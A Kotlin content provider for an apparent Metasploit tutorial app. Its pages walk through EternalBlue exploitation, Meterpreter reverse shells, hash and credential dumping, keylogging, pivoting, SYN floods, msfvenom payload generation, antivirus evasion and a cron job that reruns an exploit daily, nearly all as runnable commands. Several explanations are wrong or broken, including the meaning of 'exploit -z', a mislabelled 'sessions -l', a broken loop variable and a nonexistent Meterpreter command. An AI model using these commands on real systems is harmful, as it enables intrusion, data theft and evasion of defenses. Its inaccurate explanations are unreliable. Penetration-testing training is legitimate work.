package com.guides.content

import com.guides.NavigationState

object MetasploitContentProvider : ContentProvider {
    override fun getWelcomeMessage(): String = """
💥 Welcome to the Metasploit Ref. Guide! 💥

This comprehensive tutorial covers Metasploit, the leading penetration testing framework, from fundamentals to advanced techniques. Learn to exploit vulnerabilities, manage sessions, and automate attacks with detailed explanations and practical examples.

📖 What you'll learn:

• Basic Topics: Installation & setup, modules overview, basic exploits, workspaces
• Intermediate Topics: Meterpreter, post-exploitation, pivoting, auxiliary modules
• Advanced Topics: Custom payloads, scripting, evasion techniques, automation

🎯 How to navigate:

• Use the sidebar menu to select a topic category
• Click or tap to navigate through menus and subtopics
• Use the back button (← Back) to return to previous menus

🚀 Getting Started:

Choose a topic category from the sidebar to explore subtopics and start learning!
Each section includes thorough explanations, multiple code examples, safety tips, pro tips, common mistakes, and real-world applications.

    """.trimIndent()

    override fun getMenuContent(state: NavigationState): String {
        return when (state) {
            NavigationState.MAIN_MENU -> """
📚 Metasploit Ref. Guide

Select a category to begin:

📖 Basic Topics
Learn essential Metasploit fundamentals.

⚡ Intermediate Topics
Master exploitation techniques.

🚀 Advanced Topics
Dive into expert-level features.

❌ Exit
Close the application.
            """.trimIndent()
            NavigationState.BASIC_SUBMENU -> """
📰 Basic Topics Menu

Select a subtopic to begin learning:

🛠️ Installation & Setup
Installing Metasploit Framework.

🔍 Modules Overview
Understanding module types.

💥 Basic Exploits
Running simple exploits.

📡 Workspaces
Managing test environments.
            """.trimIndent()
            NavigationState.INTERMEDIATE_SUBMENU -> """
⚡ Intermediate Topics Menu

Select a subtopic to advance your Metasploit skills:

🖥️ Meterpreter
Using the Meterpreter shell.

🔄 Post-Exploitation
Gathering data post-exploit.

📊 Pivoting
Using compromised hosts.

🔎 Auxiliary Modules
Running non-exploit tasks.
            """.trimIndent()
            NavigationState.ADVANCED_SUBMENU -> """
🚀 Advanced Topics Menu

Select a subtopic for expert-level Metasploit knowledge:

📜 Custom Payloads
Creating tailored payloads.

🛠️ Scripting
Writing custom scripts.

🔥 Evasion Techniques
Bypassing defenses.

🔄 Automation
Automating attacks.
            """.trimIndent()
        }
    }

    override fun getTopicContent(level: String, id: String): String {
        return when (level) {
            "basics" -> when (id) {
                "install" -> """
🛠️ Installation & Setup - Getting Started with Metasploit

Metasploit is an open-source penetration testing framework for exploiting vulnerabilities. This section covers installing Metasploit, configuring the environment, and verifying setup for effective testing.

Detailed Explanation:
Metasploit Framework is available on Linux, macOS, and Windows. Install via package managers (e.g., apt, brew) or Git for the latest version. Requires Ruby, PostgreSQL for the database, and dependencies. Configure msfdb for session storage. Update with msfupdate. Verify with msfconsole.

Detailed Explanation of Installation Components:
• Package Managers: apt for Debian/Ubuntu, brew for macOS.
• Git Install: For latest features.
• Database: PostgreSQL for session tracking.
• Dependencies: Ruby, libpq-dev.
• Verification: msfconsole and version check.

Multiple Code Examples:
1. Install on Ubuntu:
```bash
sudo apt update
sudo apt install metasploit-framework
msfconsole -v
```
Explanation: Installs Metasploit, verifies version.

2. Install via Git:
```bash
git clone https://github.com/rapid7/metasploit-framework.git
cd metasploit-framework
bundle install
```
Explanation: Clones repo, installs Ruby gems.

3. Initialize Database:
```bash
msfdb init
```
Explanation: Sets up PostgreSQL database.

4. Update Metasploit:
```bash
sudo msfupdate
```
Explanation: Updates modules and framework.

5. Start msfconsole:
```bash
msfconsole
```
Explanation: Launches Metasploit console.

6. Check Database:
```bash
msf> db_status
```
Explanation: Verifies database connection.

7. Install Dependencies:
```bash
sudo apt install ruby libpq-dev
```
Explanation: Installs required libraries.

Common Mistakes:
- Not initializing database, causing session issues.
- Missing dependencies, failing startup.
- Using outdated version, missing exploits.
- Running as root, risking security.
- Not updating regularly, missing patches.
- Incorrect PATH setup.
- Ignoring db_status errors.

Real-World Applications:
- Setting up pentest labs.
- Bug bounty hunting prep.
- Teaching exploitation basics.
- Auditing network security.
- Configuring CI/CD security tests.
- Compliance testing.
- Researching vulnerabilities.

⚠️ Safety Tips:
• Download from rapid7.com or GitHub.
• Use non-root user for msfconsole.
• Secure database credentials.
• Run in a VM for isolation.
• Update regularly for security.
• Log installation steps.
• Avoid production systems.

💡 Pro Tips:
• Use msfdb reinit for database issues.
• Automate updates with cron.
• Verify gem versions with bundle check.
• Use --quiet in msfconsole for scripts.
• Integrate with Nmap via db_nmap.
• Backup .msf4 config directory.
• Test setup in a lab first.

[Interactive exercises coming soon!]

Press Escape to return to Basic Topics menu.
                """.trimIndent()
                "modules" -> """
🔍 Modules Overview - Understanding Module Types

Metasploit’s modules enable various tasks, from exploitation to scanning.

Detailed Explanation:
Modules include exploits, payloads, auxiliary, post, encoders, and nops. Exploits target vulnerabilities, payloads deliver code, auxiliary perform tasks like scanning. Search with search command. Load with use.

Detailed Explanation of Module Types:
• Exploits: Attack specific vulnerabilities.
• Payloads: Code executed post-exploit.
• Auxiliary: Scanning, fuzzing, etc.
• Post: Post-exploitation tasks.
• Encoders: Obfuscate payloads.
• Nops: Align payloads.

Multiple Code Examples:
1. Search Modules:
```bash
msf> search smb
```
Explanation: Lists SMB-related modules.

2. Use Exploit:
```bash
msf> use exploit/windows/smb/ms17_010_eternalblue
```
Explanation: Selects EternalBlue exploit.

3. List Payloads:
```bash
msf> show payloads
```
Explanation: Shows compatible payloads.

4. Set Payload:
```bash
msf> set payload windows/meterpreter/reverse_tcp
```
Explanation: Configures reverse TCP payload.

5. Auxiliary Scan:
```bash
msf> use auxiliary/scanner/portscan/tcp
```
Explanation: Selects TCP port scanner.

6. Module Info:
```bash
msf> info exploit/windows/smb/ms17_010_eternalblue
```
Explanation: Displays exploit details.

7. Save Module:
```bash
msf> save
```
Explanation: Saves current config.

Common Mistakes:
- Wrong module for target.
- Not setting required options.
- Ignoring compatibility.
- Searching with vague terms.
- Not checking module rank.

Real-World Applications:
- Vulnerability scanning.
- Pentesting workflows.
- Exploit development.

⚠️ Safety Tips:
• Verify module sources.
• Test in lab.
• Log module usage.

💡 Pro Tips:
• Use search type:exploit.
• Check module rank.
• Save configs.

[Interactive exercises coming soon!]

Press Escape to return to Basic Topics menu.
                """.trimIndent()
                "exploits" -> """
💥 Basic Exploits - Running Simple Exploits

Run basic exploits to test vulnerabilities.

Detailed Explanation:
Select exploit, set target, payload, and options (e.g., RHOSTS). Use check to verify, exploit to run. Requires valid target and permissions.

Detailed Explanation of Exploit Process:
• Selection: use <exploit>.
• Options: set RHOSTS, LHOST.
• Check: Verifies vulnerability.
• Payload: Defines post-exploit action.

Multiple Code Examples:
1. Select Exploit:
```bash
msf> use exploit/windows/smb/ms17_010_eternalblue
```
Explanation: Chooses EternalBlue exploit.

2. Set Target:
```bash
msf> set RHOSTS 192.168.1.10
```
Explanation: Sets target IP.

3. Set Payload:
```bash
msf> set payload windows/meterpreter/reverse_tcp
```
Explanation: Configures Meterpreter.

4. Check Vulnerability:
```bash
msf> check
```
Explanation: Tests if target is vulnerable.

5. Run Exploit:
```bash
msf> exploit
```
Explanation: Launches exploit.

6. Show Options:
```bash
msf> show options
```
Explanation: Lists required settings.

7. Save Session:
```bash
msf> sessions -l
```
Explanation: Lists active sessions.

Common Mistakes:
- Wrong target IP.
- Missing payload.
- No permission.
- Ignoring check results.
- Incorrect options.

Real-World Applications:
- Testing vulnerabilities.
- Pentest demos.
- Training exploits.

⚠️ Safety Tips:
• Authorized targets only.
• Log all exploits.
• Use lab environments.

💡 Pro Tips:
• Use check first.
• Save sessions.
• Combine with Nmap.

[Interactive exercises coming soon!]

Press Escape to return to Basic Topics menu.
                """.trimIndent()
                "workspaces" -> """
📡 Workspaces - Managing Test Environments

Workspaces organize testing projects in Metasploit.

Detailed Explanation:
Use workspace command to create, switch, and manage projects. Stores hosts, services, and sessions.

Detailed Explanation of Workspaces:
• Creation: workspace -a <name>.
• Switching: workspace <name>.
• Data: Hosts, vulns, sessions.

Multiple Code Examples:
1. Create Workspace:
```bash
msf> workspace -a mytest
```
Explanation: Creates new workspace.

2. Switch Workspace:
```bash
msf> workspace mytest
```
Explanation: Switches to mytest.

3. List Workspaces:
```bash
msf> workspace
```
Explanation: Shows all workspaces.

4. Delete Workspace:
```bash
msf> workspace -d mytest
```
Explanation: Deletes workspace.

5. Import Nmap:
```bash
msf> db_import nmap.xml
```
Explanation: Imports Nmap results.

6. List Hosts:
```bash
msf> hosts
```
Explanation: Shows hosts in workspace.

7. Save Workspace:
```bash
msf> save
```
Explanation: Saves workspace data.

Common Mistakes:
- Not switching workspaces.
- Mixing data across projects.
- No backups.

Real-World Applications:
- Organizing pentests.
- Team collaboration.

⚠️ Safety Tips:
• Backup workspaces.
• Secure data.

💡 Pro Tips:
• Use db_nmap.
• Export workspaces.

[Interactive exercises coming soon!]

Press Escape to return to Basic Topics menu.
                """.trimIndent()
                else -> "Content for $level-$id coming soon!"
            }
            "intermediate" -> when (id) {
                "meterpreter" -> """
🖥️ Meterpreter - Using the Meterpreter Shell

Meterpreter is a powerful post-exploitation shell in Metasploit.

Detailed Explanation:
Meterpreter runs in memory, providing file access, command execution, and more. Commands like sysinfo, upload, and getuid control the target.

Detailed Explanation of Meterpreter Features:
• Shell: Execute commands.
• File System: upload, download.
• Network: Port forwarding.
• Privileges: Escalate access.

Multiple Code Examples:
1. Launch Meterpreter:
```bash
msf> set payload windows/meterpreter/reverse_tcp
msf> exploit
```
Explanation: Starts Meterpreter session.

2. System Info:
```bash
meterpreter> sysinfo
```
Explanation: Shows target system details.

3. Upload File:
```bash
meterpreter> upload /local/file.exe "C:\\file.exe"
```
Explanation: Uploads file to target.

4. Download File:
```bash
meterpreter> download "C:\\file.txt" /local/file.txt
```
Explanation: Downloads file from target.

5. Get User ID:
```bash
meterpreter> getuid
```
Explanation: Shows current user.

6. Background Session:
```bash
meterpreter> background
```
Explanation: Returns to msfconsole.

7. Shell Access:
```bash
meterpreter> shell
```
Explanation: Opens target command prompt.

Common Mistakes:
- Not backgrounding sessions.
- Ignoring session limits.
- Wrong payload.

Real-World Applications:
- Post-exploitation.
- Data gathering.

⚠️ Safety Tips:
• Authorized targets.
• Log sessions.

💡 Pro Tips:
• Use multi/handler.
• Persist sessions.

[Interactive exercises coming soon!]

Press Escape to return to Intermediate Topics menu.
                """.trimIndent()
                "post" -> """
🔄 Post-Exploitation - Gathering Data Post-Exploit

Post-exploitation gathers data after gaining access.

Detailed Explanation:
Use post modules for tasks like credential dumping, network enumeration.

Detailed Explanation of Post-Exploitation:
• Modules: post/windows/gather/*.
• Credentials: Dump hashes, tokens.
• Enumeration: Network, processes.

Multiple Code Examples:
1. Credential Dump:
```bash
msf> use post/windows/gather/credentials
msf> set SESSION 1
```
Explanation: Dumps credentials from session.

2. Hash Dump:
```bash
meterpreter> hashdump
```
Explanation: Extracts password hashes.

3. Process List:
```bash
meterpreter> ps
```
Explanation: Lists running processes.

4. Network Enum:
```bash
msf> use post/windows/gather/enum_network
```
Explanation: Enumerates network configs.

5. Keylogger:
```bash
meterpreter> keylogrecorder
```
Explanation: Captures keystrokes.

6. Screen Capture:
```bash
meterpreter> screenshot
```
Explanation: Takes screenshot.

7. Save Data:
```bash
msf> loot
```
Explanation: Lists collected data.

Common Mistakes:
- Not checking session.
- Ignoring logs.
- No permission.

Real-World Applications:
- Data exfiltration.
- Pentest reporting.

⚠️ Safety Tips:
• Secure loot.
• Authorized only.

💡 Pro Tips:
• Automate post modules.
• Parse loot.

[Interactive exercises coming soon!]

Press Escape to return to Intermediate Topics menu.
                """.trimIndent()
                "pivoting" -> """
📊 Pivoting - Using Compromised Hosts

Pivoting uses a compromised host to attack others.

Detailed Explanation:
Route traffic through Meterpreter sessions to access internal networks.

Detailed Explanation of Pivoting:
• Routes: Add via route command.
• Port Forwarding: Forward ports.
• Socks Proxy: Proxy traffic.

Multiple Code Examples:
1. Add Route:
```bash
meterpreter> route add 192.168.2.0/24 1
```
Explanation: Routes traffic through session.

2. Port Forward:
```bash
meterpreter> portfwd add -l 8080 -r 192.168.2.10 -p 80
```
Explanation: Forwards local port to remote.

3. Socks Proxy:
```bash
msf> use auxiliary/server/socks4a
msf> set SRVPORT 1080
```
Explanation: Sets up SOCKS proxy.

4. Verify Route:
```bash
meterpreter> route
```
Explanation: Lists routes.

5. Scan via Pivot:
```bash
msf> db_nmap -sS 192.168.2.10
```
Explanation: Scans through pivot.

6. Background Pivot:
```bash
meterpreter> background
```
Explanation: Returns to console.

7. Remove Route:
```bash
meterpreter> route delete 192.168.2.0/24
```
Explanation: Removes route.

Common Mistakes:
- Wrong subnet.
- Session loss.
- No proxy setup.

Real-World Applications:
- Internal network testing.
- Multi-stage attacks.

⚠️ Safety Tips:
• Log pivots.
• Test in lab.

💡 Pro Tips:
• Use SOCKS with proxychains.
• Automate routes.

[Interactive exercises coming soon!]

Press Escape to return to Intermediate Topics menu.
                """.trimIndent()
                "auxiliary" -> """
🔎 Auxiliary Modules - Running Non-Exploit Tasks

Auxiliary modules perform tasks like scanning, fuzzing.

Detailed Explanation:
Use for reconnaissance, denial-of-service, or admin tasks.

Detailed Explanation of Auxiliary:
• Scanners: Port scans, service enum.
• Admin: Manage services.
• Fuzzers: Test inputs.

Multiple Code Examples:
1. Port Scan:
```bash
msf> use auxiliary/scanner/portscan/tcp
msf> set RHOSTS 192.168.1.0/24
```
Explanation: Scans subnet for open ports.

2. SMB Version:
```bash
msf> use auxiliary/scanner/smb/smb_version
```
Explanation: Detects SMB versions.

3. FTP Login:
```bash
msf> use auxiliary/scanner/ftp/ftp_login
```
Explanation: Tests FTP credentials.

4. DoS Test:
```bash
msf> use auxiliary/dos/tcp/synflood
```
Explanation: Simulates SYN flood.

5. Save Results:
```bash
msf> spool output.txt
```
Explanation: Logs output.

6. Run Module:
```bash
msf> run
```
Explanation: Executes auxiliary module.

7. Verbose Scan:
```bash
msf> set VERBOSE true
```
Explanation: Shows detailed output.

Common Mistakes:
- Wrong options.
- No permission.
- Ignoring results.

Real-World Applications:
- Reconnaissance.
- Compliance checks.

⚠️ Safety Tips:
• Authorized only.
• Log usage.

💡 Pro Tips:
• Combine with db_nmap.
• Save outputs.

[Interactive exercises coming soon!]

Press Escape to return to Intermediate Topics menu.
                """.trimIndent()
                else -> "Content for $level-$id coming soon!"
            }
            "advanced" -> when (id) {
                "payloads" -> """
📜 Custom Payloads - Creating Tailored Payloads

Create custom payloads for specific needs.

Detailed Explanation:
Use msfvenom to generate payloads in various formats.

Detailed Explanation of Payload Creation:
• Msfvenom: Generates payloads.
• Formats: exe, dll, python.
• Encoders: Avoid detection.

Multiple Code Examples:
1. Generate EXE:
```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.100 LPORT=4444 -f exe -o payload.exe
```
Explanation: Creates Windows executable.

2. Python Payload:
```bash
msfvenom -p python/meterpreter/reverse_tcp LHOST=192.168.1.100 -f raw > payload.py
```
Explanation: Generates Python payload.

3. Encoded Payload:
```bash
msfvenom -p windows/meterpreter/reverse_tcp -e x86/shikata_ga_nai -i 5 -f exe > encoded.exe
```
Explanation: Encodes payload five times.

4. DLL Payload:
```bash
msfvenom -p windows/meterpreter/reverse_tcp -f dll > payload.dll
```
Explanation: Creates DLL payload.

5. Stageless Payload:
```bash
msfvenom -p windows/meterpreter_reverse_tcp LHOST=192.168.1.100 -f exe > stageless.exe
```
Explanation: Uses stageless payload.

6. Verify Payload:
```bash
file payload.exe
```
Explanation: Checks file type.

7. Handler Setup:
```bash
msf> use multi/handler
msf> set payload windows/meterpreter/reverse_tcp
```
Explanation: Sets up listener.

Common Mistakes:
- Wrong LHOST/LPORT.
- No encoding.
- Incompatible formats.

Real-World Applications:
- Custom exploits.
- Pentest payloads.

⚠️ Safety Tips:
• Test in lab.
• Secure payloads.

💡 Pro Tips:
• Use msfvenom --list.
• Combine with encoders.

[Interactive exercises coming soon!]

Press Escape to return to Advanced Topics menu.
                """.trimIndent()
                "scripting" -> """
🛠️ Scripting - Writing Custom Scripts

Write Ruby scripts for Metasploit automation.

Detailed Explanation:
Use Ruby to create custom modules or automate tasks.

Detailed Explanation of Scripting:
• Modules: Exploits, auxiliary.
• Console: Automate via rc files.
• APIs: Msf::Core, Msf::Exploit.

Multiple Code Examples:
1. Basic RC Script:
```bash
echo "use exploit/windows/smb/ms17_010_eternalblue" > script.rc
msfconsole -r script.rc
```
Explanation: Runs exploit via script.

2. Ruby Module:
```ruby
require 'msf/core'
class MetasploitModule < Msf::Exploit::Remote
  def initialize(info = {})
    super(update_info(info, 'Name' => 'My Exploit'))
  end
end
```
Explanation: Defines custom exploit.

3. Save Module:
```bash
cp my_exploit.rb ~/.msf4/modules/exploits/
```
Explanation: Installs custom module.

4. Run Script:
```bash
msf> resource script.rc
```
Explanation: Executes rc script.

5. API Script:
```ruby
framework.exploits.each { |e| puts e.name }
```
Explanation: Lists all exploits.

6. Reload Module:
```bash
msf> reload_all
```
Explanation: Reloads custom modules.

7. Debug Script:
```bash
msfconsole -x "set VERBOSE true; resource script.rc"
```
Explanation: Runs with verbose output.

Common Mistakes:
- Syntax errors.
- Wrong module path.

Real-World Applications:
- Custom exploits.
- Automation.

⚠️ Safety Tips:
• Test locally.
• Secure scripts.

💡 Pro Tips:
• Use Msf::Core.
• Share modules.

[Interactive exercises coming soon!]

Press Escape to return to Advanced Topics menu.
                """.trimIndent()
                "evasion" -> """
🔥 Evasion Techniques - Bypassing Defenses

Evade AV and IDS with Metasploit techniques.

Detailed Explanation:
Use encoders, custom payloads, and transport options.

Detailed Explanation of Evasion:
• Encoders: Obfuscate payloads.
• Transports: HTTPS, DNS.
• Packing: Veil, Hyperion.

Multiple Code Examples:
1. Encode Payload:
```bash
msfvenom -p windows/meterpreter/reverse_tcp -e x86/shikata_ga_nai -i 5 -f exe > payload.exe
```
Explanation: Encodes payload five times.

2. HTTPS Transport:
```bash
msf> set payload windows/meterpreter/reverse_https
```
Explanation: Uses HTTPS for connection.

3. Custom Port:
```bash
msf> set LPORT 443
```
Explanation: Uses common port.

4. Veil Packing:
```bash
veil-evasion -p python/meterpreter/rev_tcp
```
Explanation: Packs with Veil.

5. Handler Setup:
```bash
msf> use multi/handler
msf> set payload windows/meterpreter/reverse_https
```
Explanation: Sets up HTTPS listener.

6. Verify Evasion:
```bash
msf> exploit -z
```
Explanation: Tests without session.

7. Polymorphic Payload:
```bash
msfvenom -p windows/meterpreter/reverse_tcp -b '\x00' -f exe > poly.exe
```
Explanation: Avoids null bytes.

Common Mistakes:
- Over-encoding.
- No testing.

Real-World Applications:
- Pentest evasion.
- Red teaming.

⚠️ Safety Tips:
• Authorized only.
• Log attempts.

💡 Pro Tips:
• Test with AV.
• Use custom encoders.

[Interactive exercises coming soon!]

Press Escape to return to Advanced Topics menu.
                """.trimIndent()
                "automation" -> """
🔄 Automation - Automating Attacks

Automate Metasploit tasks with scripts.

Detailed Explanation:
Use rc files, Bash, or Ruby for automation.

Detailed Explanation of Automation:
• RC Files: Automate commands.
• Bash: Run msfconsole scripts.
• Ruby: Use Metasploit APIs.

Multiple Code Examples:
1. RC Script:
```bash
echo "use exploit/windows/smb/ms17_010_eternalblue\nset RHOSTS 192.168.1.10\nexploit" > auto.rc
msfconsole -r auto.rc
```
Explanation: Automates exploit.

2. Bash Automation:
```bash
#!/bin/bash
msfconsole -x "use auxiliary/scanner/portscan/tcp; set RHOSTS \$1; run; exit"
```
Explanation: Scans target IP.

3. Ruby Automation:
```ruby
require 'msf/core'
framework = Msf::Simple::Framework.create
framework.exploits.each { |e| puts e.name }
```
Explanation: Lists exploits.

4. Cron Job:
```bash
echo "0 0 * * * msfconsole -r auto.rc" | crontab -
```
Explanation: Schedules daily exploit.

5. Save Output:
```bash
msf> spool output.txt
```
Explanation: Logs console output.

6. Error Handling:
```bash
msfconsole -r auto.rc || echo "Failed"
```
Explanation: Handles errors.

7. Multi-Target:
```bash
for ip in 192.168.1.{1..10}; do msfconsole -x "set RHOSTS \$\ip; run"; done
```
Explanation: Scans multiple IPs.

Common Mistakes:
- No error handling.
- Over-automation.

Real-World Applications:
- Scheduled scans.
- CI/CD testing.

⚠️ Safety Tips:
• Secure scripts.
• Log actions.

💡 Pro Tips:
• Use resource files.
• Integrate with Nmap.

[Interactive exercises coming soon!]

Press Escape to return to Advanced Topics menu.
                """.trimIndent()
                else -> "Content for $level-$id coming soon!"
            }
            else -> "Content for $level-$id coming soon!"
        }
    }
}